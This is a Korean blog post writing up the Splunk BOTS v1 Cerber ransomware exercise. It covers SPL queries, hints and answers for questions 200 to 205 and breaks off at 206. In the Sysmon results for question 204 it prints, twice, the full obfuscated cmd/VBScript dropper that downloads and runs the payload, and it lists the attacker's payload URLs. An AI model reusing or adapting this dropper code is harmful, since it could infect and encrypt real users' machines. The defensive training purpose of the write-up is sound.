@@ -1,0 +1,445 @@
+---
+layout: post
+current: post
+cover:  assets/built/images/splunk/bots/v1/bots-v1.jpg
+navigation: True
+title: splunk-bots-v1 write up - part2
+date: '2021-10-03 20:04:36 +0530'
+tags: [splunk]
+class: post-template
+subclass: 'post tag-splunk'
+author: wind-flow
+---
+
+## Splunk SOC 대회인 BOSS OF THE SOC(BOTS) Write up
+
+{% include bots-table-of-contents.html %}  
+  
+시나리오는 아래와 같습니다.
+
+Scenario 1 (APT):
+The focus of this hands on lab will be an APT scenario and a ransomware scenario. You assume the persona of Alice Bluebird, the analyst who has recently been hired to protect and defend Wayne Enterprises against various forms of cyberattack.
+In this scenario, reports of the below graphic come in from your user community when they visit the Wayne Enterprises website, and some of the reports reference "P01s0n1vy." In case you are unaware, P01s0n1vy is an APT group that has targeted Wayne Enterprises. Your goal, as Alice, is to investigate the defacement, with an eye towards reconstructing the attack via the Lockheed Martin Kill Chain.  
+
+\- 시나리오#1 요약  
+해킹그룹 ```P01s0n1vy```가 ```Wayne```기업를 해킹했습니다. 당신은 보안 담당자, Alice Bluebird의 입장에서 ```Lockheed Martin의 Cyberkillchain``` 모델을 이용해 침해 사고를 분석해야 합니다.
+
+![Scenario 1]({{site.url}}/assets/built/images/splunk/bots/v1/Defacement.png)
+
+![록히드마틴 사이버킬체인 7단계]({{site.url}}/assets/built/images/splunk/bots/v1/cyberkillchain.jpg)  
+[록히드마틴 사이버킬체인 7단계]
+
+Scenario 2 (Ransomeware):
+In the second scenario, one of your users is greeted by this image on a Windows desktop that is claiming that files on the system have been encrypted and payment must be made to get the files back. It appears that a machine has been infected with Cerber ransomware at Wayne Enterprises and your goal is to investigate the ransomware with an eye towards reconstructing the attack.  
+
+\- 시나리오#2 요약  
+```Wayne```기업 직원 중 한 명이 시스템의 파일이 암호화 되었으며 파일을 복호화하려면 비용을 지불해야 하는 내용의 이미지를 보게 됩니다. 시스템이 ```Wayne```의 ```Cerber 랜섬웨어```에 감염된 것으로 보이며 귀하의 목표는 재공격을 염두에 두고 랜섬웨어를 조사하는 것입니다.
+
+![Scenario 2]({{site.url}}/assets/built/images/splunk/bots/v1/ransomewere.png)
+
+200	What was the most likely IP address of we8105desk on 24AUG2016?  
+2016년 8월 24일 we8105desk의 가장 가능성이 높아 보이는 IP 주소는 무엇입니까?
+<details>
+  <summary>hint#1</summary>
+  Keep it simple and just search for the hostname provided in the question.  Try using the stats command to get a count of events by source ip address to point you in the right direction.<br>
+  
+  간단하게 유지하고 질문에 제공된 호스트 이름을 검색하십시오. stats 명령을 사용하여 소스 IP 주소별로 이벤트 수를 가져와 올바른 방향으로 조사해 보세요.
+</details>
+
+hostname이 we8105desk 키워드로 어떤 sourcetype에 가장 많이 있을지 조사해봅니다.
+
+```
+we8105desk 
+| stats count by sourcetype
+```
+
+|sourcetype|count|
+|---|---|
+|XmlWinEventLog:Microsoft-Windows-Sysmon/Operational|130354|
+|wineventlog|49006|
+|stream:smb	|1529|
+|stream:ldap	|74|
+|nessus:scan	|24|
+|stream:dns	|20|
+|WinRegistry	|3|
+|suricata	  |2|
+
+여러 sourcetype에서 해당 호스트의 IP가 있을것이지만, 그중 원격 접속인 smb sourcetype에 IP관련 필드에서 찾아봅니다.
+
+```
+we8105desk   sourcetype="stream:smb"
+```
+
+IP를 파악하기위해 smb에 눈여겨볼만한 field는 src_ip, dest_ip, path를 확인해보면 됩니다.
+
+```
+we8105desk sourcetype="stream:smb"
+| dedup src_ip dest_ip path
+| table src_ip dest_ip path
+```
+
+|src_ip|dest_ip|path|
+|---|---|---|
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\IPC$         |
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\C$         |
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\c$         |
+|192.168.2.50 |	192.168.250.100|	\\WE8105DESK\ROOT         |
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\D$         |
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\WINNT$         |
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\ADMIN$         |
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\LOGS$          |
+|192.168.2.50	|192.168.250.100|	\\WE8105DESK\ARCSERVE$          |
+|192.168.250.100|	192.168.2.50|	\\WE8105DESK\IPC$         |
+
+path의 host가 모두 WE8105DESK니, 해당 PC의 IP는 192.168.250.100일 가능성이 제일 높습니다.
+
+답 : 192.168.250.100
+
+201	Amongst the Suricata signatures that detected the Cerber malware, which one alerted the fewest number of times? Submit ONLY the signature ID value as the answer. (No punctuation, just 7 integers.)  
+Cerber 악성코드를 탐지한 Suricata 시그니처 중 가장 적게 경고한 것은? 서명 ID 값만 답변으로 제출하십시오. (문장부호는 없고 7개의 정수만 있습니다.)
+
+<details>
+  <summary>hint#1</summary>
+  Keep it simple and start your search by looking at only the sourcetype associated with Suricata and maybe even the name of the malware in question.  The field containing the signature ID should be obvious.  Use stats to create a count by the field containing the signature ID.<br>
+
+  단순하게 유지하고 Suricata와 연결된 소스 유형만 보고 심지어 문제의 맬웨어 이름까지 살펴봄으로써 검색을 시작하십시오. 서명 ID가 포함된 필드는 명확해야 합니다. 통계를 사용하여 서명 ID가 포함된 필드로 개수를 만듭니다.
+</details>
+
+suricata에서 cerber(케르베르스) 관련 이벤트가 있는지 검색해봅시다.
+```
+sourcetype=suricata *cerber*
+```
+
+alert.signature_id라는 필드가 눈에 띕니다
+![alert.signature_id]({{site.url}}/assets/built/images/splunk/bots/v1/2021-10-15-16-55-44.png)
+
+가장 적은 signature id는 2816763 입니다.
+
+답 : 2816763
+
+202	What fully qualified domain name (FQDN) does the Cerber ransomware attempt to direct the user to at the end of its encryption phase?  
+Cerber 랜섬웨어는 암호화 단계가 끝나면 어떤 FQDN(정규화된 도메인 이름)을 사용자에게 지시합니까?
+
+<details>
+  <summary>hint#1</summary>
+  Search stream:dns data for A queries coming from the infected workstation IP on the date in question.  Try and narrow your search period.<br>
+  해당 날짜에 감염된 워크스테이션 IP에서 오는 A 쿼리에 대한 검색 stream:dns에서 찾으십시오. 검색 기간을 좁혀 보십시오.
+</details>
+
+<details>
+  <summary>hint#2</summary>
+  Perform a shannon entropy analysis on the query{} field using URL toolbox by adding this to the end of the search: |`ut_shannon(query{})` | stats count by ut_shannon, query{} | sort -ut_shannon<br>
+  
+  다음을 검색 끝에 추가하여 URL 도구 상자를 사용하여 쿼리 필드에서 shannon 엔트로피 분석을 수행합니다. |`ut_shannon(query{})` | stats count by ut_shannon, query{} | sort -ut_shannon
+</details>
+
+8/24일에 WE8105DESK(192.168.250.100)가 cerber 랜섬웨어에 걸렸으므로, 이 호스트가 DNS서버에 질의했을것 입니다.
+
+url 질의 DNS 쿼리 타입은 A타입 입니다.  
+- [DNS 쿼리 타입](https://ko.wikipedia.org/wiki/DNS_%EB%A0%88%EC%BD%94%EB%93%9C_%ED%83%80%EC%9E%85_%EB%AA%A9%EB%A1%9D)
+
+(검색 기간8/24일로 설정)
+```
+sourcetype=stream:DNS src=192.168.250.100 record_type=A
+| dedup query
+| table query
+```
+
+- 결과  
+
+|query|
+|---|
+|crl.microsoft.com<br>crl.microsoft.com|
+|wpad<br>wpad|
+|we9041srv.waynecorpinc.local<br>we9041srv.waynecorpinc.local|
+|isatap<br>isatap|
+|isatap.waynecorpinc.local<br>isatap.waynecorpinc.local|
+|www.microsoft.com<br>www.microsoft.com|
+|wpad.waynecorpinc.local<br>wpad.waynecorpinc.local|
+|cerberhhyed5frqa.xmfir0.win<br>cerberhhyed5frqa.xmfir0.win|
+|www.bing.com<br>www.bing.com|
+|go.microsoft.com<br>go.microsoft.com|
+|shell.windows.com<br>shell.windows.com|
+|activation.sls.microsoft.com<br>activation.sls.microsoft.com|
+|ipinfo.io<br>ipinfo.io|
+|solidaritedeproximite.org<br>solidaritedeproximite.org|
+|dns.msftncsi.com<br>dns.msftncsi.com|
+
+위 검색결과 중 cerber키워드가 들어간 cerberhhyed5frqa.xmfir0.win가 답입니다.
+
+답 : cerberhhyed5frqa.xmfir0.win
+
+203	What was the first suspicious domain visited by we8105desk on 24AUG2016?  
+2016년 8월 24일 we8105desk가 처음으로 방문한 의심스러운 도메인은 무엇입니까?
+
+<details>
+  <summary>hint#1</summary>
+  Search stream:dns data for A queries coming from the infected workstation IP on the date in question.<br>
+  query Type이 A인 stream:dns를 조사하여 해당 날짜에 감염된 워크스테이션 IP를 분석해보세요.
+</details>
+<details>
+  <summary>hint#2</summary>
+  Use the "| reverse" SPL command to show oldest events first.<br>
+  "| reverse" SPL 명령을 사용하여 가장 오래된 이벤트를 먼저 표시합니다.
+</details>
+<details>
+  <summary>hint#3</summary>
+  Eliminate domain lookups that you can explain, question the first one you cannot.<br>
+  설명할 수 있는 도메인 조회를 제거하고 첫 번째 질문에 질문하십시오.
+</details>
+<details>
+  <summary>hint#4</summary>
+  Go and git some IOCs on Cerber.  Then compare to the DNS Data<br>
+  Cerber에 가서 IOC를 가져오세요. 그런 다음 DNS 데이터와 비교하십시오.
+</details>
+
+we8105desk src ip(192.168.250.100)를 조건을 추가한 stream:http sourcetype에 url관련 정보가 있을 것입니다.
+
+```
+src=192.168.250.100 sourcetype="stream:http"
+| sort _time
+| dedup _time url
+| table _time url
+```
+
+- 결과  
+
+|_time|url|
+|---|---|
+|2016/08/24 16:34:27.004|http://crl.microsoft.com/pki/crl/products/microsoftrootcert.crl|
+|2016/08/24 16:34:31.660|	http://crl.microsoft.com/pki/crl/products/MicCodSigPCA_08-31-2010.crl|
+|2016/08/24 16:34:36.317|	http://crl.microsoft.com/pki/crl/products/CodeSigPCA.crl|
+2016/08/24 16:34:40.943|	http://crl.microsoft.com/pki/crl/products/CodeSignPCA2.crl|
+2016/08/24 16:34:45.589|	http://crl.microsoft.com/pki/crl/products/WinPCA.crl|
+2016/08/24 16:34:50.301|	http://www.microsoft.com/pki/CRL/products/Microsoft%20Windows%20Hardware%20Compatibility%20PCA(1).crl|
+2016/08/24 16:48:13.285|	http://solidaritedeproximite.org/mhtr.jpg|
+2016/08/24 16:48:14.620|	http://92.222.104.182/mhtr.jpg|
+2016/08/24 16:49:24.504|	http://ipinfo.io/json|
+2016/08/24 16:53:21.344|	http://go.microsoft.com/fwlink/|
+2016/08/24 16:53:26.936|	http://go.microsoft.com/fwlink/|
+
+URL중 microsoft, ipinfo는 유명한 URL이지만 solidaritedeproximite.org는 알려지지 않은 URL이므로 의심 할 수 있습니다.
+
+답 : solidaritedeproximite.org
+
+204	During the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of the value of this field?  
+초기 Cerber 감염 동안 VB 스크립트가 실행됩니다. 시작하는 .exe의 이름이 앞에 추가된 이 실행의 전체 스크립트는 Splunk의 필드에서 찾을 수 있습니다. 이 필드 값의 문자 길이는 얼마입니까?
+<details>
+  <summary>hint#1</summary>
+  Keep it simple.  Start by looking at sysmon data for the infected device on the date in question.  Calculate the length of the command line using the "len()" function of the "eval" SPL command, and give your eyes a break by using the splunk table command. <br>
+  간단하게 생각하세요. 해당 날짜에 감염된 장치에 대한 sysmon 데이터를 확인하여 시작합니다. "eval" SPL 명령의 "len()" 함수를 사용하여 명령줄의 길이를 계산하고 splunk table 명령을 사용하여 시각화 합니다.
+</details>
+
+command관련 데이터는 sysmon에 있을것입니다. 아래 조건을 추가해 검색해 봅니다.
+1. .exe와 vbs(VB 스크립트)를 추가
+2. 스크립트 실행이므로 EventCode=1(Process Creation)
+3. 감염된 host인 we8105desk에서 검색
+4. ParentCommandLine과 CommandLine의 길이를 계산
+
+```
+sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational .exe *vbs*
+host=we8105desk EventCode=1
+| eval lenPcl=len(ParentCommandLine) 
+| eval lenCl=len(CommandLine)
+| table lenCl CommandLine lenPcl ParentCommandLine
+```
+
+|lenCl|CommandLine|lenPcl|ParentCommandLine|
+|---|---|---|---|
+|76|	cscript.exe /nologo C:\Windows\TEMP\AE501557-78F9-4459-8FCF-315C305567CC.vbs	|73|	"C:\Program Files (x86)\Common Files\Acronis\Infrastructure\mms_mini.exe"|
+|76|	cscript.exe /nologo C:\Windows\TEMP\8258BF6F-9A60-4ACD-87CE-C5C347639FA6.vbs	|73|	"C:\Program Files (x86)\Common Files\Acronis\Infrastructure\mms_mini.exe"|
+|76|	cscript.exe /nologo C:\Windows\TEMP\D63D009F-2486-4872-8ED8-898159C8A33B.vbs	|73|	"C:\Program Files (x86)\Common Files\Acronis\Infrastructure\mms_mini.exe"|
+|76|	cscript.exe /nologo C:\Windows\TEMP\5F336C48-BD3F-46AF-8FB1-E076BA7329CB.vbs	|73|	"C:\Program Files (x86)\Common Files\Acronis\Infrastructure\mms_mini.exe"|
+|76|	cscript.exe /nologo C:\Windows\TEMP\A1985133-B0BB-4771-9B34-54C1DC493370.vbs	|73|	"C:\Program Files (x86)\Common Files\Acronis\Infrastructure\mms_mini.exe"|
+|76|	cscript.exe /nologo C:\Windows\TEMP\E5548D7D-7D5D-4693-A892-94129A925C26.vbs	|73|	"C:\Program Files (x86)\Common Files\Acronis\Infrastructure\mms_mini.exe"|
+|4490|	cmd.exe /V /C set "GSI=%APPDATA%\%RANDOM%.vbs" &amp;&amp; (for %i in ("DIm RWRL" "FuNCtioN GNbiPp(Pt5SZ1)" "EYnt=45" "GNbiPp=AsC(Pt5SZ1)" "Xn1=52" "eNd fuNCtiON" "SUb OjrYyD9()" "J0Nepq=56" "Dim UJv,G4coQ" "LT=23" "dO WHiLE UJv&lt;&gt;3016-3015" "G4coQ=G4coQ+1" "WSCRiPt.sLEeP(11)" "LoOP" "UsZK0=85" "ENd suB" "fuNctIon J7(BLI4A3)" "K5AU=29" "J7=cHR(BLI4A3)" "XBNutM9=36" "eNd fuNCtiON" "SUb MA(QrG)" "WXCzRz=9" "Dim Jw" "Qt7=34" "Jw=TIMeR+QrG" "Do WhiLE tIMEr&lt;Jw" "WSCRipT.sleEP(6)" "LOOp" "EXdkRkH=78" "enD sUB" "fUnCTion M1p67jL(BwqIM7,Qa)" "Yi=80" "dIM KH,ChnFY,RX,Pg,C6YT(8)" "Cm=7" "C6YT(1)=107" "Rzf=58" "C6YT(5)=115" "BSKoW=10" "C6YT(4)=56" "Cwd6=35" "C6YT(7)=110" "AQ=98" "C6YT(6)=100" "Y6Cm1I=82" "C6YT(2)=103" "JH3F2i=74" "C6YT(8)=119" "JRvsG2s=76" "C6YT(3)=53" "Yh=31" "C6YT(0)=115" "GuvD=47" "Tbvf1=67" "SeT KH=cReATeObject(A9y("3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D", "Yo"))" "V2JR=73" "Set ChnFY=KH.GETfilE(BwqIM7)" "RGeJ=68" "SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)" "CtxOk=82" "seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)" "XPL9af=76" "Do uNtil Pg.aTEnDOfStReam" "RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))" "LooP" "IQz=49" "RX.cloSe" "CBR1gC7=51" "Pg.cLOSE" "PmG=64" "eNd funCTIOn" "FUNcTION Ql9zEF()" "IBL2=16" "Ql9zEF=secoND(Time)" "MUTkPNJ=41" "End FUNcTiOn" "FUnCtion A9y(Am,T1GCbB)" "CWCH9r=82" "Dim V3sl0m,F4ra,AxFE" "RLLp8R=89" "For V3sl0m=1 To (lEn(Am)/2)" "F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))" "AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))" "A9y=A9y+J7(OyVNo(F4ra,AxFE))" "NeXT" "DxZ40=89" "enD fUNction" "Sub AylniN()" "N6nzb=92" "DIm GWJCk,Q3y,GKasG0" "FDu=47" "GWJCk=93961822" "UZ=32" "FoR Q3y=1 To GWJCk" "GKasG0=GKasG0+1" "neXt" "B1jq2Hk=63" "If GKasG0=GWJCk tHen" "KXso=18" "MA((-176+446))" "IP4=48" "Yq(A9y("0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826","QcOi4XA"))" "YTsWy=31" "elSe" "DO5gpmA=84" "A8=86" "EnD iF" "XyUP=64" "eND SuB" "sUB GKfD3aY(FaddNPJ)" "SDU0BLq=57" "DiM UPhqZ,KbcT" "DxejPK=88" "KbcT="Drn4AW"" "GROlc7=82" "sET UPhqZ=CREAteOBJecT(A9y("332A7B05156A211A46243629",KbcT))" "Gs0g=3" "UPhqZ.OpEn" "TF1=68" "UPhqZ.tyPE=6867-6866" "RDjmY=24" "UPhqZ.wrITe FaddNPJ" "WiFgvS=78" "UPhqZ.SaVeTOfIle RWRL,8725-8723" "AF=4" "UPhqZ.closE" "JC7sf2=1" "Cke4e" "JM=88" "EnD suB" "fuNCtIoN Yq(PDqi1)" "I0=22" "DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK" "GJDnbE=32" "On ErrOR reSume NeXT" "B7bT=1" "Uv="Tk"" "ELw=73" "sEt YTwwO=CREaTeObjeCT(A9y("3C07082602241F7A383C0E3807",Uv))" "K4=62" "GAiF" "IS1cj=19" "Set Dzc0=YTwwO.eNVIrONMEnt(A9y("013B183400023A","EQiWw"))" "D9S=38" "RWRL=Dzc0(A9y("14630811720C14","XU3"))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF" "AtCQ=95" "JiYwVG="FcQqQ"" "Tf=79" "sEt BAU7Cz=CrEATEoBjECT(A9y("2E38122329103E1725683B1C3D19123701",JiYwVG))" "QUY=56" "BAU7Cz.OpeN A9y("0D0E1E","KJ"),PDqi1,7387-7387" "JX2=58" "BAU7Cz.SeTReQuEstHeAdeR A9y("1F59242828","OM8J"),A9y("0D354C3D356B567A0F6B6B","VoL8XF")" "URkT=71" "BAU7Cz.SEnD()" "QdFeA6=65" "if BAU7Cz.StaTUstExt=A9y("652840353A542512023C5B3D572F27","S5I2A") then" "PwTLW23=36" "GAiF" "R4xYBS=63" "MA(4)" "PjL6m=46" "GKfD3aY BAU7Cz.ReSpONSEbody" "Fj98=72" "Else" "D7T=91" "IK="NNXFD0"" "NK=74" "SeT BAU7Cz= CreATeobJECT(A9y("033125365F3D213E326A68030210121060",IK))" "QJ=35" "BAU7Cz.oPeN A9y("2A2F0E","TmjZ8d"),A9y("07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26","Ao" ),5022-5022" "UMp8=85" "BAU7Cz.SeTReqUesTheadER A9y("1439190A24","AFXwm"),A9y("371038301A716C5F7B6644","LUi")" "NluUc=93" "BAU7Cz.SENd()" "EOtR=44" "If BAU7Cz.STaTUSTexT=A9y("03510A3B3A51146F105F163B365E0C","OS0x") THen GKfD3aY BAU7Cz.REsPOnSeBODY" "Q6sMEZ=54" "I9Nl7=56" "end if" "Dq=54" "eND FuNCTioN" "fUNctIon OyVNo(U1,Brt0d)" "SNOW=59" "OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)" "QTi5K=54" "enD funcTION" "Sub Cke4e()" "WTOyAw=62" "dIM EuM,WIbud,NCiN,Fs8HJ" "A5AT=92" "NCiN=""""" "SX6=93" "WIbud=RWRL &amp; Ql9zEF &amp; A9y("4A330F3F","WdGbOGp")" "V5B7Zh=92" "M1p67jL RWRL,WIbud" "L13=45" "iF Fs8HJ="" tHen MA(4)" "CHaK=38" "EuM="Iqxkf"" "U56m=67" "SEt VP=creATeoBJEcT(A9y("262B081420010C453521141407",EuM))" "U5Quw=85" "VP.Run A9y("1023287B163629755C0D6C06270F1E01536C6E7551","UsNL") &amp; WIbud &amp; NCiN,2912-2912,5755-5755" "A6mfcYL=76" "End sUB" "JoxZ3=43" "AylniN" "suB GAiF()" "G4vzM=95" "Dim DCRml9g, CjoNOY9" "For DCRml9g = 68 To 6000327" "CjoNOY9 = Rvwr + 23 + 35 + 27" "Next" "KK0H=46" "enD sUb") do @echo %~i)&gt;"!GSI!" &amp;&amp; start "" "!GSI!" |100|	"C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE" /n /f "D:\Miranda_Tate_unveiled.dotm"| 
+|93|	"C:\Windows\System32\WScript.exe" "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\20429.vbs"	|4490|	cmd.exe /V /C set "GSI=%APPDATA%\%RANDOM%.vbs" &amp;&amp; (for %i in ("DIm RWRL" "FuNCtioN GNbiPp(Pt5SZ1)" "EYnt=45" "GNbiPp=AsC(Pt5SZ1)" "Xn1=52" "eNd fuNCtiON" "SUb OjrYyD9()" "J0Nepq=56" "Dim UJv,G4coQ" "LT=23" "dO WHiLE UJv&lt;&gt;3016-3015" "G4coQ=G4coQ+1" "WSCRiPt.sLEeP(11)" "LoOP" "UsZK0=85" "ENd suB" "fuNctIon J7(BLI4A3)" "K5AU=29" "J7=cHR(BLI4A3)" "XBNutM9=36" "eNd fuNCtiON" "SUb MA(QrG)" "WXCzRz=9" "Dim Jw" "Qt7=34" "Jw=TIMeR+QrG" "Do WhiLE tIMEr&lt;Jw" "WSCRipT.sleEP(6)" "LOOp" "EXdkRkH=78" "enD sUB" "fUnCTion M1p67jL(BwqIM7,Qa)" "Yi=80" "dIM KH,ChnFY,RX,Pg,C6YT(8)" "Cm=7" "C6YT(1)=107" "Rzf=58" "C6YT(5)=115" "BSKoW=10" "C6YT(4)=56" "Cwd6=35" "C6YT(7)=110" "AQ=98" "C6YT(6)=100" "Y6Cm1I=82" "C6YT(2)=103" "JH3F2i=74" "C6YT(8)=119" "JRvsG2s=76" "C6YT(3)=53" "Yh=31" "C6YT(0)=115" "GuvD=47" "Tbvf1=67" "SeT KH=cReATeObject(A9y("3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D", "Yo"))" "V2JR=73" "Set ChnFY=KH.GETfilE(BwqIM7)" "RGeJ=68" "SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)" "CtxOk=82" "seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)" "XPL9af=76" "Do uNtil Pg.aTEnDOfStReam" "RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))" "LooP" "IQz=49" "RX.cloSe" "CBR1gC7=51" "Pg.cLOSE" "PmG=64" "eNd funCTIOn" "FUNcTION Ql9zEF()" "IBL2=16" "Ql9zEF=secoND(Time)" "MUTkPNJ=41" "End FUNcTiOn" "FUnCtion A9y(Am,T1GCbB)" "CWCH9r=82" "Dim V3sl0m,F4ra,AxFE" "RLLp8R=89" "For V3sl0m=1 To (lEn(Am)/2)" "F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))" "AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))" "A9y=A9y+J7(OyVNo(F4ra,AxFE))" "NeXT" "DxZ40=89" "enD fUNction" "Sub AylniN()" "N6nzb=92" "DIm GWJCk,Q3y,GKasG0" "FDu=47" "GWJCk=93961822" "UZ=32" "FoR Q3y=1 To GWJCk" "GKasG0=GKasG0+1" "neXt" "B1jq2Hk=63" "If GKasG0=GWJCk tHen" "KXso=18" "MA((-176+446))" "IP4=48" "Yq(A9y("0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826","QcOi4XA"))" "YTsWy=31" "elSe" "DO5gpmA=84" "A8=86" "EnD iF" "XyUP=64" "eND SuB" "sUB GKfD3aY(FaddNPJ)" "SDU0BLq=57" "DiM UPhqZ,KbcT" "DxejPK=88" "KbcT="Drn4AW"" "GROlc7=82" "sET UPhqZ=CREAteOBJecT(A9y("332A7B05156A211A46243629",KbcT))" "Gs0g=3" "UPhqZ.OpEn" "TF1=68" "UPhqZ.tyPE=6867-6866" "RDjmY=24" "UPhqZ.wrITe FaddNPJ" "WiFgvS=78" "UPhqZ.SaVeTOfIle RWRL,8725-8723" "AF=4" "UPhqZ.closE" "JC7sf2=1" "Cke4e" "JM=88" "EnD suB" "fuNCtIoN Yq(PDqi1)" "I0=22" "DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK" "GJDnbE=32" "On ErrOR reSume NeXT" "B7bT=1" "Uv="Tk"" "ELw=73" "sEt YTwwO=CREaTeObjeCT(A9y("3C07082602241F7A383C0E3807",Uv))" "K4=62" "GAiF" "IS1cj=19" "Set Dzc0=YTwwO.eNVIrONMEnt(A9y("013B183400023A","EQiWw"))" "D9S=38" "RWRL=Dzc0(A9y("14630811720C14","XU3"))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF" "AtCQ=95" "JiYwVG="FcQqQ"" "Tf=79" "sEt BAU7Cz=CrEATEoBjECT(A9y("2E38122329103E1725683B1C3D19123701",JiYwVG))" "QUY=56" "BAU7Cz.OpeN A9y("0D0E1E","KJ"),PDqi1,7387-7387" "JX2=58" "BAU7Cz.SeTReQuEstHeAdeR A9y("1F59242828","OM8J"),A9y("0D354C3D356B567A0F6B6B","VoL8XF")" "URkT=71" "BAU7Cz.SEnD()" "QdFeA6=65" "if BAU7Cz.StaTUstExt=A9y("652840353A542512023C5B3D572F27","S5I2A") then" "PwTLW23=36" "GAiF" "R4xYBS=63" "MA(4)" "PjL6m=46" "GKfD3aY BAU7Cz.ReSpONSEbody" "Fj98=72" "Else" "D7T=91" "IK="NNXFD0"" "NK=74" "SeT BAU7Cz= CreATeobJECT(A9y("033125365F3D213E326A68030210121060",IK))" "QJ=35" "BAU7Cz.oPeN A9y("2A2F0E","TmjZ8d"),A9y("07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26","Ao" ),5022-5022" "UMp8=85" "BAU7Cz.SeTReqUesTheadER A9y("1439190A24","AFXwm"),A9y("371038301A716C5F7B6644","LUi")" "NluUc=93" "BAU7Cz.SENd()" "EOtR=44" "If BAU7Cz.STaTUSTexT=A9y("03510A3B3A51146F105F163B365E0C","OS0x") THen GKfD3aY BAU7Cz.REsPOnSeBODY" "Q6sMEZ=54" "I9Nl7=56" "end if" "Dq=54" "eND FuNCTioN" "fUNctIon OyVNo(U1,Brt0d)" "SNOW=59" "OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)" "QTi5K=54" "enD funcTION" "Sub Cke4e()" "WTOyAw=62" "dIM EuM,WIbud,NCiN,Fs8HJ" "A5AT=92" "NCiN=""""" "SX6=93" "WIbud=RWRL &amp; Ql9zEF &amp; A9y("4A330F3F","WdGbOGp")" "V5B7Zh=92" "M1p67jL RWRL,WIbud" "L13=45" "iF Fs8HJ="" tHen MA(4)" "CHaK=38" "EuM="Iqxkf"" "U56m=67" "SEt VP=creATeoBJEcT(A9y("262B081420010C453521141407",EuM))" "U5Quw=85" "VP.Run A9y("1023287B163629755C0D6C06270F1E01536C6E7551","UsNL") &amp; WIbud &amp; NCiN,2912-2912,5755-5755" "A6mfcYL=76" "End sUB" "JoxZ3=43" "AylniN" "suB GAiF()" "G4vzM=95" "Dim DCRml9g, CjoNOY9" "For DCRml9g = 68 To 6000327" "CjoNOY9 = Rvwr + 23 + 35 + 27" "Next" "KK0H=46" "enD sUb") do @echo %~i)&gt;"!GSI!" &amp;&amp; start "" "!GSI!"|
+|102|	"C:\Windows\System32\cmd.exe" /C START "" "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"|93|"C:\Windows\System32\WScript.exe" "C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\20429.vbs"|
+|100|	"C:\Windows\System32\WScript.exe" "C:\Users\bob.smith.WAYNECORPINC\Desktop\# DECRYPT MY FILES #.vbs"	|96|	"C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe"|
+
+vbs를 처음 실행하는 명령어의 길이는 4490입니다.
+
+답 : 4490
+
+205	What is the name of the USB key inserted by Bob Smith?  
+Bob Smith가 삽입한 USB 키의 이름은 무엇입니까?
+<details>
+  <summary>hint#1</summary>
+  Tough question.  Perhaps you should give http://answers.splunk.com a try.<br>
+  어려운 문제입니다. http://answer.splunk.com을 사용해 보십시오.
+</details>
+USB의 이름은 friendlyname 컬럼에 저장되어있습니다. 해당값은 registry에 저장되어있으므로 sourcetype은 WinRegistry 입니다.
+
+[FriendlyName이란?](https://en.wiktionary.org/wiki/friendly_name)
+
+```
+friendlyname
+```
+- 결과  
+```
+08/24/2016 10:42:17.287  
+event_status="(0)The operation completed successfully."  
+pid=708  
+process_image="c:\Windows\System32\svchost.exe"  
+registry_type="SetValue"  
+key_path="HKLM\system\controlset001\enum\wpdbusenumroot\umb\2&37c186b&0&storage#volume#_??_usbstor#disk&ven_generic&prod_flash_disk&rev_8.07#7d961196&0#\friendlyname"  
+data_type="REG_SZ"  
+data="MIRANDA_PRI"  
+host=we8105desk source=WinRegistry sourcetype=WinRegistry
+```
+
+registry의 data값이 MIRANDA_PRI임을 알수 있습니다.
+
+답 : MIRANDA_PRI
+
+206	Bob Smith's workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?  
+Bob Smith의 워크스테이션(we8105desk)은 랜섬웨어가 발생하는 동안 파일 서버에 연결되었습니다. 파일 서버의 IP 주소는 무엇입니까?
+
+<details>
+  <summary>hint#1</summary>
+  Search for SMB (Windows file sharing protocol) traffic from the infected device on the date in question. The "stats" SPL command can be used to count the most common destination IP for the SMB protocol.  
